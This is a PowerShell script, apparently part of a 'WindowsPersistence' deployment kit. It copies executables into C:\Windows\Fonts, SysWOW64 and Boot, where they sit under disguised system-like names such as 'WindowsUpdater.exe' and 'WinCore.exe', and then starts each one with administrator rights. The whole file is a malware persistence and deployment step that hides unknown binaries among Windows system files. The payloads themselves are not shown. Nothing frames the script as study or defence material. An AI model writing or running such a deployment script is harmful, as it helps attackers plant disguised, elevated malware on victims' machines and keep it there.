# Define source and destination paths
$copyPaths = @{
    "..\WindowsPersistence\Deploy\Bin1 to Fonts\" = "C:\Windows\Fonts\";
    "..\WindowsPersistence\Deploy\Bin2 to Syswow64\" = "C:\Windows\SysWOW64\";
    "..\WindowsPersistence\Deploy\Bin3 to Boot\" = "C:\Windows\Boot\";
}

# Copy files from source to destination
foreach ($source in $copyPaths.Keys) {
    $destination = $copyPaths[$source]

    if (Test-Path -Path $source) {
        # Ensure the destination directory exists
        if (!(Test-Path -Path $destination)) {
            New-Item -ItemType Directory -Path $destination -Force
            Write-Output "Created directory: $destination"
        }

        # Copy contents from source to destination
        try {
            Copy-Item -Path "$source*" -Destination $destination -Recurse -Force
            Write-Output "Copied files from $source to $destination"
        }
        catch {
            Write-Output "Failed to copy files from $source to $destination - $($_.Exception.Message)"
        }
    }
    else {
        Write-Output "Source directory not found: $source"
    }
}

# Define binaries to run as admin
$binaries = @(
    "C:\Windows\Fonts\Windows Service Scheduler.exe",
    "C:\Windows\SysWOW64\WinCore.exe",
    "C:\Windows\Boot\WindowsUpdater.exe"
)

# Run each binary as administrator
foreach ($binary in $binaries) {
    if (Test-Path -Path $binary) {
        try {
            Start-Process -FilePath $binary -Verb RunAs
            Write-Output "Executed $binary as administrator"
        }
        catch {
            Write-Output "Failed to execute $binary as administrator - $($_.Exception.Message)"
        }
    }
    else {
        Write-Output "Binary not found: $binary"
    }
}
